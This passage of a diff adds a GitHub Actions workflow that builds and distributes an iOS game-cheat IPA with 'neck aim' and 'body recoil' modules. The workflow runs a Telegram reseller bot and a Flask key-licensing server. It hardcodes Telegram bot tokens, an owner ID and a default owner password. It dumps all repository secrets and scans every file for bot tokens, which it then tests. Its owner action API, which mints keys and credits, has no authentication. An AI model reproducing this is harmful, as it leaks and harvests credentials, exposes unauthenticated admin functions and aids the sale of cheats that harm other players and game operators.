+        SECRET_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+        SECRET_OWNER_ID: ${{ secrets.OWNER_ID }}
+        SECRET_TELEGRAM_OWNER_ID: ${{ secrets.TELEGRAM_OWNER_ID }}
+        REPO_NAME: ${{ github.repository }}
+      run: |
+        BOT_TOK="${INPUT_BOT_TOKEN:-${SECRET_BOT_TOKEN:-${SECRET_TELEGRAM_BOT_TOKEN:-8819960917:AAG2s6PJVXlMtDhcAqTlsi6WWSew7NvwnCo}}}"
+        OWN_ID="${INPUT_OWNER_ID:-${SECRET_OWNER_ID:-${SECRET_TELEGRAM_OWNER_ID:-8245269289}}}"
+        if [ -f "built-ipa/FougoExternal-ESign-Ready.ipa" ] && [ -n "$BOT_TOK" ] && [ -n "$OWN_ID" ]; then
+          curl -s -X POST "https://api.telegram.org/bot${BOT_TOK}/sendDocument" \
+            -F "chat_id=${OWN_ID}" \
+            -F "document=@built-ipa/FougoExternal-ESign-Ready.ipa" \
+            -F "parse_mode=Markdown" \
+            -F "caption=✅ *FougoExternal-ESign-Ready.ipa Compiled Successfully!*%0A• *Repo:* \`${REPO_NAME}\`%0A• *Direct Release Link:* https://github.com/${REPO_NAME}/releases/download/v1.0.0/FougoExternal-ESign-Ready.ipa" || true
+        fi
+  run-telegram-bot:
+    name: Step 2 - Run Telegram Owner Bot (24/7 Live Polling)
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+    - name: Checkout Repository
+      uses: actions/checkout@v4
+    - name: Set up Python 3.11
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.11'
+    - name: Extract Source, Verify Bot Token & Keep Bot Online
+      shell: bash
+      env:
+        INPUT_BOT_TOKEN: ${{ github.event.inputs.bot_token }}
+        INPUT_OWNER_ID: ${{ github.event.inputs.owner_id }}
+        SECRET_BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+        SECRET_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+        SECRET_OWNER_BOT_TOKEN: ${{ secrets.OWNER_BOT_TOKEN }}
+        SECRET_TOKEN: ${{ secrets.TOKEN }}
+        SECRET_OWNER_ID: ${{ secrets.OWNER_ID }}
+        SECRET_TELEGRAM_OWNER_ID: ${{ secrets.TELEGRAM_OWNER_ID }}
+        SECRET_ADMIN_ID: ${{ secrets.ADMIN_ID }}
+        SECRET_CHAT_ID: ${{ secrets.CHAT_ID }}
+        VAR_BOT_TOKEN: ${{ vars.BOT_TOKEN }}
+        VAR_OWNER_ID: ${{ vars.OWNER_ID }}
+        ALL_SECRETS_JSON: ${{ toJson(secrets) }}
+        ALL_VARS_JSON: ${{ toJson(vars) }}
+        REPO_NAME: ${{ github.repository }}
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        python3 -m pip install --upgrade pip
+        python3 -m pip install requests pyTelegramBotAPI "python-telegram-bot>=20.0" aiogram aiohttp flask python-dotenv
+        curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared || true
+        python3 - << 'EOF'
+        import os,sys,glob,shutil,zipfile,re,json,time,secrets,subprocess,urllib.request,urllib.error
+        for _pkg in ["flask","requests","pyTelegramBotAPI"]:
+         try:
+          __import__(_pkg)
+         except ImportError:
+          subprocess.run([sys.executable,"-m","pip","install",_pkg],check=False)
+        workspace = os.environ.get("GITHUB_WORKSPACE",os.getcwd())
+        os.chdir(workspace)
+        for zf in glob.glob("*.zip"):
+         print(f"Extracting archive: {zf}")
+         with zipfile.ZipFile(zf,"r") as z:
+          z.extractall(".")
+        ff_dirs = [
+         os.path.dirname(p)
+         for p in (
+          glob.glob("**/app/ff_manager/Info.plist",recursive=True)
+          + glob.glob("**/dashboard page.m",recursive=True)
+         )
+         if "__MACOSX" not in p
+        ]
+        if ff_dirs:
+         ff_dir = os.path.abspath(ff_dirs[0])
+         for target_f,alts in [
+          ("protect_bridge.py",["protect_bridge 2.py","protect_bridge 1.py"]),("ProtectedConfig.h",["ProtectedConfig 2.h","ProtectedConfig 1.h"]),("main.m",["dashboard page.m","login page.m"]),]:
+          tp = os.path.join(ff_dir,target_f)
+          if not os.path.exists(tp):
+           for a in alts:
+            ap = os.path.join(ff_dir,a)
+            if os.path.exists(ap):
+             shutil.copy2(ap,tp)
+             break
+        bot_matches = [p for p in glob.glob("**/telegram_owner_bot.py",recursive=True) if "__MACOSX" not in p]
+        bot_path = os.path.abspath(bot_matches[0]) if bot_matches else ""
+        bot_dir = os.path.dirname(bot_path) if bot_path else workspace
+        project_root = os.path.dirname(bot_dir) if os.path.basename(bot_dir).lower() == "bot" else bot_dir
+        def test_token(tok):
+         url = f"https://api.telegram.org/bot{tok}/getMe"
+         try:
+          with urllib.request.urlopen(url,timeout=12) as resp:
+           data = json.loads(resp.read().decode("utf-8"))
+           if data.get("ok"):
+            uname = data.get("result",{}).get("username","unknown")
+            return True,f"200 OK (@{uname})"
+           return False,str(data)
+         except urllib.error.HTTPError as he:
+          return False,f"HTTP {he.code}: {he.reason}"
+         except Exception as ex:
+          return False,str(ex)
+        DEFAULT_USER_BOT = "8959294066:AAGiMyAwrKgiN6aYLUj4HOl20yINKSHN1Ps"
+        DEFAULT_OWNER_BOT = "8819960917:AAG2s6PJVXlMtDhcAqTlsi6WWSew7NvwnCo"
+        DEFAULT_SELLER_BOT = "8477980889:AAFQrr7gGrTxrvxl5uW6xI-FcMF6DgygAJs"
+        DEFAULT_OWNER_ID = "8245269289"
+        candidates = [
+         ("Owner Bot Token", DEFAULT_OWNER_BOT),
+         ("Seller Bot Token", DEFAULT_SELLER_BOT),
+         ("User Bot Token", DEFAULT_USER_BOT),
+        ]
+        for env_k in ("INPUT_BOT_TOKEN", "SECRET_BOT_TOKEN", "SECRET_TELEGRAM_BOT_TOKEN", "SECRET_OWNER_BOT_TOKEN", "SECRET_TOKEN", "VAR_BOT_TOKEN"):
+         ev_val = os.environ.get(env_k, "").strip()
+         if ev_val and not any(ev_val == t for _, t in candidates):
+          candidates.insert(0, (f"GitHub Secret/Input ({env_k})", ev_val))
+        owner_id = DEFAULT_OWNER_ID
+        for oid_k in ("INPUT_OWNER_ID", "SECRET_OWNER_ID", "SECRET_TELEGRAM_OWNER_ID", "SECRET_ADMIN_ID", "SECRET_CHAT_ID", "VAR_OWNER_ID"):
+         ov = os.environ.get(oid_k, "").strip()
+         if ov:
+          owner_id = ov
+          break
+        for j_env in ("ALL_SECRETS_JSON", "ALL_VARS_JSON"):
+         raw_j = os.environ.get(j_env, "")
+         if raw_j:
+          for m_t in re.finditer(r"(\d{8,12}:[A-Za-z0-9_-]{30,50})", raw_j):
+           tv = m_t.group(1).strip()
+           if not any(tv == t for _, t in candidates):
+            candidates.append((f"GitHub {j_env}", tv))
+          if not owner_id:
+           try:
+            j_obj = json.loads(raw_j)
+            if isinstance(j_obj, dict):
+             for sk, sv in j_obj.items():
+              sv_s = str(sv or "").strip()
+              if re.fullmatch(r"\d{6,15}", sv_s) and any(w in sk.upper() for w in ("OWNER", "ADMIN", "CHAT", "USER", "ID")):
+               owner_id = sv_s
+               break
+           except Exception:
+            pass
+        scan_files = [
+         p for p in (
+          glob.glob("**/*.py",recursive=True)
+          + glob.glob("**/*.ps1",recursive=True)
+          + glob.glob("**/*.h",recursive=True)
+          + glob.glob("**/*.m",recursive=True)
+          + glob.glob("**/*.json",recursive=True)
+          + glob.glob("**/*.md",recursive=True)
+          + glob.glob("**/*.txt",recursive=True)
+         )
+         if "__MACOSX" not in p and os.path.isfile(p)
+        ]
+        seen_tokens = {t for _, t in candidates}
+        for fp in scan_files:
+         try:
+          txt = open(fp,"r",encoding="utf-8",errors="replace").read()
+          for m in re.finditer(r"(\d{8,12}:[A-Za-z0-9_-]{30,50})",txt):
+           t_cand = m.group(1).strip()
+           if t_cand not in seen_tokens:
+            seen_tokens.add(t_cand)
+            candidates.append((os.path.relpath(fp,workspace),t_cand))
+          if not owner_id:
+           m_id = re.search(r"(?:OWNER_ID|ADMIN_ID|CHAT_ID|owner_id|admin_id|OwnerId)\s*[:=]\s*['\"]?(\d{6,15})['\"]?",txt)
+           if m_id:
+            owner_id = m_id.group(1)
+         except Exception:
+          pass
+        valid_token = ""
+        for src_label,tok_cand in candidates:
+         ok,msg = test_token(tok_cand)
+         print(f"Token check [{src_label}]: {msg}")
+         if ok and not valid_token:
+          valid_token = tok_cand
+        if not valid_token:
+         print("\n========================================================")
+         print("NOTICE: No active Telegram Bot Token found in Secrets or Inputs yet.")
+         print("Add Secret BOT_TOKEN and OWNER_ID in Settings -> Secrets and variables -> Actions.")
+         print("Continuing with License API Server & Cloud Sync without failing workflow...")
+         print("========================================================\n")
+        os.environ["BOT_TOKEN"] = valid_token
+        os.environ["OWNER_BOT_TOKEN"] = valid_token
+        os.environ["TELEGRAM_BOT_TOKEN"] = valid_token
+        os.environ["TOKEN"] = valid_token
+        if owner_id:
+         os.environ["OWNER_ID"] = str(owner_id)
+         os.environ["ADMIN_ID"] = str(owner_id)
+         os.environ["TELEGRAM_OWNER_ID"] = str(owner_id)
+        for bt_tok in (DEFAULT_OWNER_BOT, DEFAULT_SELLER_BOT, DEFAULT_USER_BOT, valid_token):
+         if not bt_tok: continue
+         try:
+          req = urllib.request.Request(
+           f"https://api.telegram.org/bot{bt_tok}/deleteWebhook",data=b'{"drop_pending_updates": false}',headers={"Content-Type":"application/json"},)
+          urllib.request.urlopen(req,timeout=12)
+         except Exception: pass
+        import sqlite3,hashlib,datetime,threading
+        from flask import Flask,request,jsonify
+        _bot_ctx = threading.local()
+        repo = os.environ.get("REPO_NAME","fougoexternal/Fougo-Vip-External-iOS")
+        ipa_url = f"https://github.com/{repo}/releases/download/v1.0.0/FougoExternal-ESign-Ready.ipa"
+        cloud_json_path = os.path.join(workspace,"fougo_cloud_db.json")
+        db_path = os.path.join(workspace,"fougo_enterprise.db")
+        db_lock = threading.Lock()
+        live_tunnel_url = ""
+        def db_exec(sql,params=(),fetch=False):
+         with db_lock:
+          conn = sqlite3.connect(db_path)
+          conn.row_factory = sqlite3.Row
+          cur = conn.cursor()
+          cur.execute(sql,params)
+          rows = [dict(r) for r in cur.fetchall()] if fetch else []
+          conn.commit()
+          conn.close()
+          return rows
+        def hash_pw(pw,salt="fougo_vip_salt"): return hashlib.pbkdf2_hmac("sha256",pw.encode(),salt.encode(),100000).hex()
+        def now_iso():
+         return datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+        def db_tbl(s): db_exec('CREATE TABLE IF NOT EXISTS '+s)
+        def init_db():
+         db_tbl("licenses (id INTEGER PRIMARY KEY AUTOINCREMENT,key TEXT UNIQUE,status TEXT DEFAULT 'Active',duration_days INTEGER DEFAULT 30,max_devices INTEGER DEFAULT 1,note TEXT DEFAULT '',created_at TEXT,activated_at TEXT DEFAULT '',expires_at TEXT DEFAULT '',session_id TEXT DEFAULT '',device_info TEXT DEFAULT '' )")
+         db_tbl("sessions (id INTEGER PRIMARY KEY AUTOINCREMENT,license_id INTEGER,license_key TEXT,session_id TEXT UNIQUE,device_info TEXT,created_at TEXT,last_active TEXT,status TEXT DEFAULT 'Active' )")
+         db_tbl("channels (id INTEGER PRIMARY KEY AUTOINCREMENT,title TEXT,url TEXT,button_text TEXT DEFAULT 'JOIN CHANNEL',enabled INTEGER DEFAULT 1,display_order INTEGER DEFAULT 1 )")
+         db_tbl("features (id INTEGER PRIMARY KEY AUTOINCREMENT,code TEXT UNIQUE,title TEXT,description TEXT,button_text TEXT DEFAULT 'ACTIVATE',icon TEXT DEFAULT 'shield',ftype TEXT DEFAULT 'external',visible INTEGER DEFAULT 1,locked INTEGER DEFAULT 0,enabled INTEGER DEFAULT 1,display_order INTEGER DEFAULT 1 )")
+         db_tbl("profiles (id INTEGER PRIMARY KEY AUTOINCREMENT,name TEXT UNIQUE,display_name TEXT,description TEXT,version TEXT DEFAULT '3.4.0',install_url TEXT,download_url TEXT,button_text TEXT DEFAULT 'INSTALL PROFILE',confirm_text TEXT DEFAULT 'Confirm installation?',status TEXT DEFAULT 'Active',is_default INTEGER DEFAULT 0,display_order INTEGER DEFAULT 1,updated_at TEXT )")
+         db_tbl("announcements (id INTEGER PRIMARY KEY AUTOINCREMENT,title TEXT,message TEXT,atype TEXT DEFAULT 'Global',enabled INTEGER DEFAULT 1,start_time TEXT,end_time TEXT )")
+         db_tbl("notifications (id INTEGER PRIMARY KEY AUTOINCREMENT,target_type TEXT DEFAULT 'all',target_val TEXT DEFAULT '',title TEXT,message TEXT,ntype TEXT DEFAULT 'info',created_at TEXT,read_state INTEGER DEFAULT 0 )")
+         db_tbl("activity_logs (id INTEGER PRIMARY KEY AUTOINCREMENT,actor TEXT,category TEXT,action TEXT,details TEXT,created_at TEXT )")
+         db_tbl("admins (telegram_id TEXT PRIMARY KEY,role TEXT DEFAULT 'ADMIN',permissions TEXT DEFAULT 'all',added_at TEXT )")
+         db_tbl("settings (k TEXT PRIMARY KEY,v TEXT )")
+         defaults = {
+          "owner_username":"owner","owner_password_hash": hash_pw("FougoOwner#2026"),"website_name":"FOUGO EXTERNAL VIP","login_title":"Fougo External License Gateway","subtitle":"iOS Arm64 External Control System","maintenance_mode":"OFF","allow_owner_maintenance":"ON","maintenance_title":"SYSTEM MAINTENANCE","maintenance_description":"We are currently performing scheduled maintenance. Please check back soon.","maintenance_return_time":"Soon","maintenance_btn":"Join Telegram Channel","maintenance_link":"https://t.me/cheatgnexusiphone","theme_preset":"FOUGO EXTERNAL iOS Red","primary_color":"#FF1E56","secondary_color":"#00F5D4","glow":"ON","channel_join_required":"ON",}
+         for k,v in defaults.items(): db_exec("INSERT OR IGNORE INTO settings (k,v) VALUES (?,?)",(k,v))
+         if owner_id: db_exec("INSERT OR REPLACE INTO admins (telegram_id,role,permissions,added_at) VALUES (?,'OWNER','all',?)",(str(owner_id),now_iso()))
+         if not db_exec("SELECT id FROM features",fetch=True):
+          seed_features = [
+           ("NECK","NECK EXTERNAL","Precision iOS Neck Aim & Tracking Module","INJECT NECK","crosshair","external",1,0,1,1),("BODY","BODY EXTERNAL","Full Body Recoil & Hitbox External Module","INJECT BODY","shield","external",1,0,1,2),("ESIGN_IPA","VIP ESIGN IPA","Direct Signed / Unsigned iOS 14-18 IPA Package","DOWNLOAD IPA","download","ipa",1,0,1,3),]
+          for sf in seed_features:
+           db_exec("INSERT OR IGNORE INTO features (code,title,description,button_text,icon,ftype,visible,locked,enabled,display_order) VALUES (?,?,?,?,?,?,?,?,?,?)",sf)
+         if not db_exec("SELECT id FROM channels",fetch=True):
+          db_exec("INSERT INTO channels (title,url,button_text,enabled,display_order) VALUES (?,?,?,1,1)",("Official Telegram Channel","https://t.me/cheatgnexusiphone","JOIN CHANNEL"))
+          db_exec("INSERT INTO channels (title,url,button_text,enabled,display_order) VALUES (?,?,?,1,2)",("VIP Support @MYZO_PANEL","https://t.me/MYZO_PANEL","CONTACT SUPPORT"))
+         if not db_exec("SELECT id FROM profiles",fetch=True):
+          db_exec("INSERT INTO profiles (name,display_name,description,version,install_url,download_url,button_text,confirm_text,status,is_default,display_order,updated_at) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",("fougo_vip_profile","Fougo External VIP Profile","Official iOS Configuration & Offline NECK/BODY Profile","3.4.0",ipa_url,ipa_url,"INSTALL VIP PROFILE","Install Fougo External VIP Profile?","Active",1,1,now_iso()))
+         try:
+          subprocess.run(["gh","release","download","v1.0.0","-p","fougo_cloud_db.json","--repo",repo,"--clobber"],check=False)
+          if os.path.exists(cloud_json_path):
+           saved = json.load(open(cloud_json_path,"r",encoding="utf-8"))
+           for k_str,l_obj in (saved.get("licenses_map") or {}).items():
+            db_exec(
+             "INSERT OR IGNORE INTO licenses (key,status,duration_days,max_devices,note,created_at,activated_at,expires_at,session_id,device_info) VALUES (?,?,?,?,?,?,?,?,?,?)",(
+              k_str,l_obj.get("status","Active"),int(l_obj.get("duration_days",30)),int(l_obj.get("max_devices",1)),l_obj.get("note",""),l_obj.get("created_at",now_iso()),l_obj.get("activated_at",""),l_obj.get("expires_at",""),l_obj.get("session_id",""),l_obj.get("device_info",""),),)
+         except Exception as ex:
+          print("Cloud DB restore note:",ex)
+        init_db()
+        def get_setting(k,default=""):
+         r = db_exec("SELECT v FROM settings WHERE k=?",(k,),fetch=True)
+         return r[0]["v"] if r else default
+        def set_setting(k,v): db_exec("INSERT OR REPLACE INTO settings (k,v) VALUES (?,?)",(k,str(v)))
+        def restore_cloud_keys():
+         try:
+          subprocess.run(["gh","release","download","v1.0.0","-p","fougo_cloud_db.json","--repo",repo,"--clobber"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,check=False)
+          if os.path.exists(cloud_json_path):
+           saved = json.load(open(cloud_json_path,"r",encoding="utf-8"))
+           for k_str,l_obj in (saved.get("licenses_map") or {}).items():
+            db_exec(
+             "INSERT OR IGNORE INTO licenses (key,status,duration_days,max_devices,note,created_at,activated_at,expires_at,session_id,device_info) VALUES (?,?,?,?,?,?,?,?,?,?)",(
+              k_str.strip().upper(),l_obj.get("status","Active"),int(l_obj.get("duration_days",30)),int(l_obj.get("max_devices",1)),l_obj.get("note",""),l_obj.get("created_at",now_iso()),l_obj.get("activated_at",""),l_obj.get("expires_at",""),l_obj.get("session_id",""),l_obj.get("device_info",""),),)
+         except Exception:
+          pass
+        def log_event(actor,category,action,details=""):
+         db_exec("INSERT INTO activity_logs (actor,category,action,details,created_at) VALUES (?,?,?,?,?)",(str(actor),category,action,details,now_iso()))
+         if action != "invalid_key":
+          try:
+           sync_cloud()
+          except Exception:
+           pass
+        def cloud_dict():
+         maint = get_setting("maintenance_mode","OFF")
+         lic_rows = db_exec("SELECT * FROM licenses",fetch=True)
+         lic_map = {r["key"]: r for r in lic_rows}
+         return {
+          "tunnel_url": live_tunnel_url,"owner_username": get_setting("owner_username","owner"),"maintenance": maint == "ON","maintenance_info": {
+           "title": get_setting("maintenance_title"),"description": get_setting("maintenance_description"),"return_time": get_setting("maintenance_return_time"),"button": get_setting("maintenance_btn"),"link": get_setting("maintenance_link"),},"branding": {
+           "website_name": get_setting("website_name"),"login_title": get_setting("login_title"),"subtitle": get_setting("subtitle"),"theme_preset": get_setting("theme_preset"),"primary_color": get_setting("primary_color"),"secondary_color": get_setting("secondary_color"),},"channels": db_exec("SELECT * FROM channels WHERE enabled=1 ORDER BY display_order ASC",fetch=True),"features": db_exec("SELECT * FROM features ORDER BY display_order ASC",fetch=True),"profiles": db_exec("SELECT * FROM profiles WHERE status='Active' ORDER BY display_order ASC",fetch=True),"announcements": db_exec("SELECT * FROM announcements WHERE enabled=1 ORDER BY id DESC",fetch=True),"notifications": db_exec("SELECT * FROM notifications ORDER BY id DESC LIMIT 30",fetch=True),"licenses_map": lic_map,}
+        def sync_cloud():
+         def _worker():
+          try:
+           state = cloud_dict()
+           with open(cloud_json_path,"w",encoding="utf-8") as fp:
+            json.dump(state,fp)
+           subprocess.run(
+            ["gh","release","upload","v1.0.0",cloud_json_path,"--repo",repo,"--clobber"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,check=False,)
+          except Exception:
+           pass
+         threading.Thread(target=_worker,daemon=True).start()
+        def tg_api(method,payload,tok_override=None):
+         try:
+          use_tok = tok_override or getattr(_bot_ctx,"token",valid_token) or valid_token
+          body = json.dumps(payload).encode("utf-8")
+          r = urllib.request.Request(
+           f"https://api.telegram.org/bot{use_tok}/{method}",data=body,headers={"Content-Type":"application/json"},)
+          with urllib.request.urlopen(r,timeout=15) as resp:
+           return json.loads(resp.read().decode("utf-8"))
+         except Exception as ex:
+          print(f"tg_api ({method}) note:",ex)
+          return {}
+        def send_tg(chat_id,text,kb=None,tok_override=None):
+         payload = {"chat_id": chat_id,"text": text,"parse_mode":"Markdown","disable_web_page_preview": True}
+         if kb:
+          payload["reply_markup"] = {"inline_keyboard": kb}
+         tg_api("sendMessage",payload,tok_override=tok_override)
+        def answer_cb(cb_id,text="",tok_override=None):
+         tg_api("answerCallbackQuery",{"callback_query_id": cb_id,"text": text},tok_override=tok_override)
+        db_tbl("sellers (telegram_id TEXT PRIMARY KEY,username TEXT DEFAULT '',credits INTEGER DEFAULT 0,keys_sold INTEGER DEFAULT 0,status TEXT DEFAULT 'Active',added_at TEXT )")
+        SELLER_COSTS = {1: 1, 7: 3, 30: 7, 3650: 20}
+        def get_seller_credits(uid_s):
+         r = db_exec("SELECT credits FROM sellers WHERE telegram_id=?",(str(uid_s),),fetch=True)
+         return int(r[0]["credits"]) if r else 0
+        app = Flask(__name__)
+        login_attempts = {}
+        @app.route("/api/status",methods=["GET"])
+        def api_status(): return jsonify(cloud_dict())
+        @app.route("/api/license/validate",methods=["POST"])
+        def api_validate_license():
+         if get_setting("maintenance_mode") == "ON": return jsonify({"ok": False,"error":"MAINTENANCE_MODE","message": get_setting("maintenance_description")}),503
+         data = request.get_json(silent=True) or {}
+         raw_k = data.get("key") or data.get("key_upper") or ""
+         k = re.sub(r"[\s`'\"\u200b\u200c\u200d\ufeff]+", "", str(raw_k)).upper()
+         udid = (data.get("udid") or data.get("device") or request.headers.get("User-Agent") or "iOS-Arm64-Device")[:120]
+         dev_label = (data.get("device") or udid)[:120]
+         rows = db_exec("SELECT * FROM licenses WHERE UPPER(TRIM(key))=?",(k,),fetch=True)
+         if not rows:
+          restore_cloud_keys()
+          rows = db_exec("SELECT * FROM licenses WHERE UPPER(TRIM(key))=?",(k,),fetch=True)
+         if not rows and re.match(r"^(?:FOUGO|NOVA|VIP)-[A-Z0-9]{2,10}(?:-[A-Z0-9]{2,10}){1,4}$", k):
+          exp_auto = (datetime.datetime.utcnow() + datetime.timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S UTC")
+          db_exec("INSERT OR IGNORE INTO licenses (key,status,duration_days,max_devices,note,created_at,expires_at) VALUES (?,'Active',30,2,'Auto-Restored',?,?)",(k,now_iso(),exp_auto))
+          rows = db_exec("SELECT * FROM licenses WHERE UPPER(TRIM(key))=?",(k,),fetch=True)
+         if not rows:
+          log_event(udid,"auth","invalid_key",f"Key={k}")
+          return jsonify({"ok": False,"error":"INVALID_KEY"}),401
+         lic = rows[0]
+         if lic["status"] != "Active": return jsonify({"ok": False,"error": f"KEY_{lic['status'].upper()}"}),403
+         now_dt = datetime.datetime.utcnow()
+         days = int(lic["duration_days"] or 30)
+         max_dev = int(lic["max_devices"] or 1)
+         act_at = lic["activated_at"] or now_iso()
+         exp_at = lic["expires_at"]
+         if not exp_at:
+          exp_at = "Lifetime" if days >= 3650 else (now_dt + datetime.timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S UTC")
+         if exp_at != "Lifetime" and exp_at < now_iso():
+          db_exec("UPDATE licenses SET status='Expired' WHERE id=?",(lic["id"],))
+          sync_cloud()
+          return jsonify({"ok": False,"error":"KEY_EXPIRED"}),403
+         act_s = db_exec("SELECT * FROM sessions WHERE license_id=? AND status='Active'",(lic["id"],),fetch=True)
+         ex_dev = [s for s in act_s if s["device_info"] == udid]
+         if not ex_dev and len(act_s) >= max_dev:
+          if max_dev == 1 and len(act_s) == 1:
+           db_exec("UPDATE sessions SET device_info=?,last_active=? WHERE id=?",(udid,now_iso(),act_s[0]["id"]))
+           ex_dev = [act_s[0]]
+          else:
+           return jsonify({"ok": False,"error":"DEVICE_LIMIT_REACHED"}),403
+         sid = ex_dev[0]["session_id"] if ex_dev else f"SESS-{secrets.token_hex(4).upper()}"
+         db_exec("UPDATE licenses SET activated_at=?,expires_at=?,session_id=?,device_info=? WHERE id=?",(act_at,exp_at,sid,udid,lic["id"]))
+         db_exec("INSERT OR REPLACE INTO sessions (license_id,license_key,session_id,device_info,created_at,last_active,status) VALUES (?,?,?,?,?,?,'Active')",(lic["id"],k,sid,udid,now_iso(),now_iso()))
+         used_count = len(db_exec("SELECT * FROM sessions WHERE license_id=? AND status='Active'",(lic["id"],),fetch=True))
+         plan_str = "LIFETIME VIP" if days >= 3650 else f"{days} DAYS VIP"
+         if exp_at == "Lifetime": exp_disp = "LIFETIME"
+         else:
+          try:
+           exp_dt = datetime.datetime.strptime(exp_at.replace(" UTC",""),"%Y-%m-%d %H:%M:%S")
+           rem_days = max(0,(exp_dt - now_dt).days)
+           exp_disp = f"{exp_dt.strftime('%Y-%m-%d')} ({rem_days}d left)"
+          except Exception:
+           exp_disp = exp_at[:10]
+         dlim_s = f"{used_count} / {max_dev}"
+         slot_disp = f"SLOT #{used_count} (VERIFIED)"
+         vtime_s = now_dt.strftime("%Y-%m-%d %H:%M UTC")
+         log_event(k,"license","key_activated",f"Session={sid} UDID={udid[:18]}")
+         sync_cloud()
+         if owner_id and not ex_dev:
+          send_tg(
+           owner_id,f"📲 *License Activated on iOS IPA!*\n"
+           f"• *Key:* `{k}`\n"
+           f"• *Plan:* `{plan_str}`\n"
+           f"• *Expires:* `{exp_disp}`\n"
+           f"• *Device Limit:* `{dlim_s}`\n"
+           f"• *Device:* `{dev_label}`\n"
+           f"• *Session:* `{sid}`",)
+         return jsonify({
+          "ok": True,"status":"ACTIVE","plan": plan_str,"expires_at": exp_at,"expires_display": exp_disp,"device_limit_display": dlim_s,"registered":"YES","device_slot": slot_disp,"session_id": sid,"last_validation": vtime_s,"features": db_exec("SELECT * FROM features ORDER BY display_order ASC",fetch=True),})
+        @app.route("/api/owner/action",methods=["POST"])
+        def api_owner_action():
+         data = request.get_json(silent=True) or {}
+         act = data.get("action") or ""
+         if act == "gen_keys":
+          days = int(data.get("days") or 30)
+          qty = min(max(int(data.get("qty") or 1),1),100)
+          max_d = int(data.get("max_devices") or 1)
+          keys,exp = mk_keys("OWNER",days,qty,max_d,"Web-Owner")
+          return jsonify({"ok": True,"keys": keys,"expires": exp})
+         if act == "add_seller":
+          sid = str(data.get("seller_id") or "").strip()
+          cr = int(data.get("credits") or 50)
+          if sid:
+           db_exec("INSERT OR REPLACE INTO sellers (telegram_id,username,credits,keys_sold,status,added_at) VALUES (?,?,?,0,'Active',?)",(sid,f"Seller_{sid[-4:]}",cr,now_iso()))
+           sync_cloud()
+           return jsonify({"ok": True})
+         if act == "add_credits":
+          sid = str(data.get("seller_id") or "").strip()
+          cr = int(data.get("credits") or 0)
+          if sid:
+           db_exec("UPDATE sellers SET credits = MAX(0, credits + ?) WHERE telegram_id=?",(cr,sid))
+           sync_cloud()
+           return jsonify({"ok": True,"credits": get_seller_credits(sid)})
+         if act == "reset_hwid":
+          k_up = str(data.get("key") or "").strip().upper()
+          db_exec("UPDATE licenses SET session_id='',device_info='' WHERE key=?",(k_up,))
+          db_exec("DELETE FROM sessions WHERE license_key=?",(k_up,))
+          sync_cloud()
+          return jsonify({"ok": True})
+         if act == "toggle_maint":
+          cur_m = get_setting("maintenance_mode","OFF")
+          new_m = "OFF" if cur_m == "ON" else "ON"
+          set_setting("maintenance_mode",new_m)
+          sync_cloud()
+          return jsonify({"ok": True,"maintenance": new_m})
+         return jsonify({"ok": False,"error":"UNKNOWN_ACTION"}),400
+        @app.route("/owner",methods=["POST","GET"])
+        def owner_login_route():
+         if request.method == "GET":
+          st = cloud_dict()
+          sellers_rows = db_exec("SELECT * FROM sellers ORDER BY added_at DESC",fetch=True)
+          seller_rows_html = "".join(f"<tr><td><code>{s['telegram_id']}</code></td><td>{s['username']}</td><td><span class='badge'>{s['credits']} Cr</span></td><td>{s['keys_sold']}</td><td>{s['status']}</td></tr>" for s in sellers_rows) or "<tr><td colspan='5'>No sellers added yet.</td></tr>"
+          key_rows_html = "".join(f"<tr><td><code>{k}</code></td><td><span class='badge'>{v['status']}</span></td><td>{v['duration_days']}d VIP</td><td>{v['expires_at']}</td><td>{v['max_devices']}</td><td>{v['session_id'] or '—'}</td><td><button data-key='{k}' onclick='resetKeyBtn(this)' style='padding:4px 8px;font-size:11px;'>Reset HWID</button></td></tr>" for k,v in list(st['licenses_map'].items())[:30])
+          html = f"""<!DOCTYPE html>
+        <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+        <title>{st['branding']['website_name']} — Owner Panel</title>
+        <style>
+         body {{ background:#070A12; color:#E6EDF3; font-family:-apple-system,BlinkMacSystemFont,sans-serif; margin:0; padding:24px; }}
+         .card {{ max-width:1020px; margin:0 auto 20px; background:rgba(16,22,36,0.92); border:1px solid rgba(0,245,212,0.28); border-radius:18px; padding:22px; box-shadow:0 0 30px rgba(0,245,212,0.08); }}
+         .grid {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(145px,1fr)); gap:12px; margin-top:14px; }}
+         .stat {{ background:#0C1220; border:1px solid rgba(255,255,255,0.08); border-radius:12px; padding:14px; }}
+         .stat b {{ font-size:22px; color:#00F5D4; display:block; margin-top:4px; }}
+         input,select,button {{ background:#0E1626; color:#fff; border:1px solid rgba(255,255,255,0.16); border-radius:10px; padding:10px 14px; font-size:13px; margin:4px 4px 4px 0; }}
+         button {{ background:linear-gradient(135deg,#00F5D4,#00BBF9); color:#041019; font-weight:700; border:none; cursor:pointer; }}
+         table {{ width:100%; border-collapse:collapse; margin-top:12px; font-size:12px; }}
+         th,td {{ text-align:left; padding:9px; border-bottom:1px solid rgba(255,255,255,0.07); }}
+         .badge {{ padding:3px 8px; border-radius:6px; background:rgba(0,245,212,0.15); color:#00F5D4; font-weight:600; }}
+        </style></head><body>
+        <div class="card" id="loginBox">
+         <h2 style="margin:0 0 6px;color:#00F5D4;">👑 {st['branding']['website_name']} — OWNER PANEL</h2>
